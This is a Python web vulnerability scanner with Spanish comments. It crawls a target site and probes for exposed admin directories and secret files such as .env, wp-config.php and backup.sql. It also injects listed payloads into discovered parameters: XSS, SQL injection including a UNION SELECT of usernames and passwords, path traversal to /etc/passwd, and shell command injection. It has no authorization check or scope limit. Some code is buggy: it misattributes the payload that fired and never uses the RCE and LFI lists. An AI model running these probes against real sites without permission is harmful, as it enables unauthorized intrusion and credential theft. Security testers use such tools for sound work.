#!/usr/bin/env python3
import requests
import re
import os
import argparse
import json
from datetime import datetime
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import sys
import logging
from fake_useragent import UserAgent

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('web_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Configuración avanzada
CONFIG = {
    "USER_AGENT": UserAgent().random,
    "TIMEOUT": 10,
    "THREADS": 10,
    "PAYLOADS": {
        "XSS": [
            "<script>alert(1)</script>",
            "'\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "onerror=alert(1)",
            "\"><img src=x onerror=alert(1)>"
        ],
        "SQLi": [
            "'", "\"", 
            "' OR 1=1 --", 
            "\" OR 1=1 --",
            "admin'--",
            "' UNION SELECT null,username,password FROM users--",
            "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--"
        ],
        "LFI": [
            "../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ],
        "RCE": [
            ";id",
            "|id",
            "`id`",
            "$(id)"
        ]
    },
    "ERROR_PATTERNS": {
        "SQLi": re.compile(
            r"you have an error in your sql syntax|warning: mysql|unclosed quotation mark|quoted string not properly terminated|sql syntax.*mysql",
            re.IGNORECASE
        ),
        "XSS": re.compile(
            r"<script>alert\(1\)</script>|onerror=alert\(1\)|javascript:alert\(1\)",
            re.IGNORECASE
        )
    },
    "DIRECTORIES": [
        'admin', 'login', 'backup', 'test', 'old', 'private', 
        'config', 'uploads', 'includes', 'tmp', 'wp-admin',
        'phpmyadmin', 'dbadmin', 'sql', 'backups'
    ],
    "FILES": [
        'config.php', '.env', 'database.php', 'backup.zip',
        'backup.sql', 'credentials.txt', 'wp-config.php'
    ],
    "REPORT_DIR": "reports"
}

class WebScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.domain = urlparse(target_url).netloc
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': CONFIG['USER_AGENT']})
        self.results = {
            "XSS": [],
            "SQLi": [],
            "LFI": [],
            "RCE": [],
            "Directories": [],
            "Files": [],
            "Forms": [],
            "Links": []
        }
        self.discovered_urls = set()
        self.vulnerable_urls = set()

    def is_valid_url(self, url):
        """Verifica si una URL es válida y pertenece al dominio objetivo"""
        parsed = urlparse(url)
        return bool(parsed.netloc) and parsed.netloc == self.domain

    def send_request(self, url, method='GET', params=None, data=None):
        """Envía una solicitud HTTP con manejo de errores"""
        try:
            if method.upper() == 'GET':
                response = self.session.get(
                    url, 
                    params=params, 
                    timeout=CONFIG['TIMEOUT'],
                    allow_redirects=False
                )
            else:
                response = self.session.post(
                    url, 
                    data=data, 
                    timeout=CONFIG['TIMEOUT'],
                    allow_redirects=False
                )
            return response
        except requests.RequestException as e:
            logger.error(f"Error al acceder a {url}: {e}")
            return None

    def crawl_website(self):
        """Crawler básico para descubrir URLs y formularios"""
        logger.info("Iniciando crawler para descubrir URLs y formularios...")
        try:
            response = self.send_request(self.target_url)
            if not response:
                return

            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Encontrar todos los links
            for link in soup.find_all('a', href=True):
                url = urljoin(self.target_url, link['href'])
                if self.is_valid_url(url) and url not in self.discovered_urls:
                    self.discovered_urls.add(url)
                    self.results['Links'].append(url)
            
            # Encontrar todos los formularios
            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                form_method = form.get('method', 'GET').upper()
                form_url = urljoin(self.target_url, form_action)
                
                if self.is_valid_url(form_url):
                    form_data = {}
                    for input_tag in form.find_all('input'):
                        input_name = input_tag.get('name')
                        input_type = input_tag.get('type', 'text')
                        input_value = input_tag.get('value', '')
                        
                        if input_name and input_type != 'submit':
                            form_data[input_name] = input_value
                    
                    self.results['Forms'].append({
                        'url': form_url,
                        'method': form_method,
                        'inputs': form_data
                    })
        except Exception as e:
            logger.error(f"Error en el crawler: {e}")

    def scan_xss(self, url, params=None):
        """Escanea vulnerabilidades XSS"""
        test_urls = []
        
        if params:
            # Si hay parámetros GET, probar cada uno
            for param_name, param_value in params.items():
                for payload in CONFIG['PAYLOADS']['XSS']:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    test_urls.append((url, test_params))
        else:
            # Si no hay parámetros, probar como query string
            for payload in CONFIG['PAYLOADS']['XSS']:
                test_url = f"{url}?test={payload}"
                test_urls.append((test_url, None))
        
        # Probar todas las URLs de prueba
        for test_url, test_params in test_urls:
            response = self.send_request(test_url, params=test_params)
            if response and CONFIG['ERROR_PATTERNS']['XSS'].search(response.text):
                result = {
                    'url': test_url,
                    'payload': payload,
                    'vulnerable': True
                }
                self.results['XSS'].append(result)
                self.vulnerable_urls.add(test_url)
                logger.warning(f"Posible XSS detectado en: {test_url}")

    def scan_sqli(self, url, params=None):
        """Escanea vulnerabilidades SQL Injection"""
        test_urls = []
        
        if params:
            for param_name, param_value in params.items():
                for payload in CONFIG['PAYLOADS']['SQLi']:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    test_urls.append((url, test_params))
        else:
            for payload in CONFIG['PAYLOADS']['SQLi']:
                test_url = f"{url}?id=1{payload}"
                test_urls.append((test_url, None))
        
        for test_url, test_params in test_urls:
            response = self.send_request(test_url, params=test_params)
            if response and CONFIG['ERROR_PATTERNS']['SQLi'].search(response.text):
                result = {
                    'url': test_url,
                    'payload': payload,
                    'vulnerable': True
                }
                self.results['SQLi'].append(result)
                self.vulnerable_urls.add(test_url)
                logger.warning(f"Posible SQLi detectado en: {test_url}")

    def scan_directories(self):
        """Escanea directorios comunes"""
        def check_directory(dir_path):
            url = f"{self.target_url}/{dir_path}/"
            response = self.send_request(url)
            if response and response.status_code == 200:
                self.results['Directories'].append(url)
                logger.warning(f"Directorio accesible encontrado: {url}")
                return url
            return None
        
        with ThreadPoolExecutor(max_workers=CONFIG['THREADS']) as executor:
            futures = [executor.submit(check_directory, dir_path) for dir_path in CONFIG['DIRECTORIES']]
            for future in as_completed(futures):
                future.result()

    def scan_files(self):
        """Escanea archivos sensibles"""
        def check_file(file_path):
            url = f"{self.target_url}/{file_path}"
            response = self.send_request(url)
            if response and response.status_code == 200:
                self.results['Files'].append(url)
                logger.warning(f"Archivo accesible encontrado: {url}")
                return url
            return None
        
        with ThreadPoolExecutor(max_workers=CONFIG['THREADS']) as executor:
            futures = [executor.submit(check_file, file_path) for file_path in CONFIG['FILES']]
            for future in as_completed(futures):
                future.result()

    def scan_all(self):
        """Ejecuta todos los escaneos"""
        logger.info(f"Iniciando escaneo de {self.target_url}")
        
        # Fase 1: Crawling
        self.crawl_website()
        
        # Fase 2: Escaneo de directorios y archivos
        self.scan_directories()
        self.scan_files()
        
        # Fase 3: Escaneo de vulnerabilidades
        # Escanear URLs descubiertas
        for url in self.discovered_urls:
            parsed = urlparse(url)
            if parsed.query:
                # Si la URL tiene parámetros GET
                params = dict(pair.split('=') for pair in parsed.query.split('&'))
                self.scan_xss(url, params)
                self.scan_sqli(url, params)
            else:
                self.scan_xss(url)
                self.scan_sqli(url)
        
        # Escanear formularios descubiertos
        for form in self.results['Forms']:
            if form['method'] == 'GET':
                self.scan_xss(form['url'], form['inputs'])
                self.scan_sqli(form['url'], form['inputs'])
            else:
                # Para POST, necesitaríamos implementar pruebas específicas
                pass
        
        logger.info("Escaneo completado")

    def generate_report(self):
        """Genera reportes en varios formatos"""
        if not os.path.exists(CONFIG['REPORT_DIR']):
            os.makedirs(CONFIG['REPORT_DIR'])
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        base_filename = f"scan_report_{self.domain}_{timestamp}"
        
        # Reporte JSON
        json_report = {
            "target": self.target_url,
            "date": datetime.now().isoformat(),
            "results": self.results
        }
        
        json_path = os.path.join(CONFIG['REPORT_DIR'], f"{base_filename}.json")
        with open(json_path, 'w') as f:
            json.dump(json_report, f, indent=2)
        logger.info(f"Reporte JSON generado: {json_path}")
        
        # Reporte HTML
        html_path = os.path.join(CONFIG['REPORT_DIR'], f"{base_filename}.html")
        self._generate_html_report(html_path)
        logger.info(f"Reporte HTML generado: {html_path}")
        
        # Reporte Markdown
        md_path = os.path.join(CONFIG['REPORT_DIR'], f"{base_filename}.md")
        self._generate_markdown_report(md_path)
        logger.info(f"Reporte Markdown generado: {md_path}")

    def _generate_html_report(self, filepath):
        """Genera un reporte HTML detallado"""
        html_template = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Web Vulnerability Scan Report - {self.domain}</title>
            <style>
                body {{ font-family: Arial, sans-serif; line-height: 1.6; padding: 20px; }}
                h1, h2 {{ color: #2c3e50; }}
                .vulnerability {{ margin-bottom: 20px; padding: 15px; border-radius: 5px; }}
                .critical {{ background-color: #ffdddd; border-left: 5px solid #f44336; }}
                .warning {{ background-color: #fff4dd; border-left: 5px solid #ff9800; }}
                .info {{ background-color: #e7f3fe; border-left: 5px solid #2196F3; }}
                .success {{ background-color: #ddffdd; border-left: 5px solid #4CAF50; }}
                pre {{ background-color: #f5f5f5; padding: 10px; border-radius: 3px; }}
                a {{ color: #3498db; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
            </style>
        </head>
        <body>
            <h1>Web Vulnerability Scan Report</h1>
            <p><strong>Target:</strong> {self.target_url}</p>
            <p><strong>Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            
            <h2>Summary</h2>
            <ul>
                <li>XSS Vulnerabilities: {len(self.results['XSS'])}</li>
                <li>SQL Injection Vulnerabilities: {len(self.results['SQLi'])}</li>
                <li>Sensitive Directories Found: {len(self.results['Directories'])}</li>
                <li>Sensitive Files Found: {len(self.results['Files'])}</li>
            </ul>
        """
        
        # Secciones detalladas
        for vuln_type, items in self.results.items():
            if items:
                html_template += f"<h2>{vuln_type}</h2>\n"
                
                if vuln_type in ['XSS', 'SQLi']:
                    for item in items:
                        html_template += f"""
                        <div class="vulnerability critical">
                            <h3>Vulnerability Found</h3>
                            <p><strong>URL:</strong> <a href="{item['url']}" target="_blank">{item['url']}</a></p>
                            <p><strong>Payload:</strong> <code>{item['payload']}</code></p>
                        </div>
                        """
                elif vuln_type in ['Directories', 'Files']:
                    html_template += "<div class='vulnerability warning'><ul>\n"
                    for item in items:
                        html_template += f"<li><a href='{item}' target='_blank'>{item}</a></li>\n"
                    html_template += "</ul></div>\n"
        
        html_template += """
            <footer>
                <p>Generated by Advanced Web Scanner</p>
            </footer>
        </body>
        </html>
        """
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_template)

    def _generate_markdown_report(self, filepath):
        """Genera un reporte en formato Markdown"""
        md_content = f"""
# Web Vulnerability Scan Report

- **Target**: {self.target_url}
- **Date**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## Summary

- XSS Vulnerabilities: {len(self.results['XSS'])}
- SQL Injection Vulnerabilities: {len(self.results['SQLi'])}
- Sensitive Directories Found: {len(self.results['Directories'])}
- Sensitive Files Found: {len(self.results['Files'])}
"""
        
        for vuln_type, items in self.results.items():
            if items:
                md_content += f"\n## {vuln_type}\n\n"
                
                if vuln_type in ['XSS', 'SQLi']:
                    for item in items:
                        md_content += f"""
### Vulnerability Found

- **URL**: [{item['url']}]({item['url']})
- **Payload**: `{item['payload']}`

"""
                elif vuln_type in ['Directories', 'Files']:
                    for item in items:
                        md_content += f"- [{item}]({item})\n"
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(md_content)

def main():
    parser = argparse.ArgumentParser(description='Advanced Web Vulnerability Scanner')
    parser.add_argument('url', help='URL to scan')
    parser.add_argument('--threads', type=int, default=CONFIG['THREADS'], 
                       help='Number of threads to use')
    parser.add_argument('--output', help='Output directory for reports')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    if args.output:
        CONFIG['REPORT_DIR'] = args.output
    
    if args.threads:
        CONFIG['THREADS'] = args.threads
    
    scanner = WebScanner(args.url)
    scanner.scan_all()
    scanner.generate_report()

if __name__ == '__main__':
    main()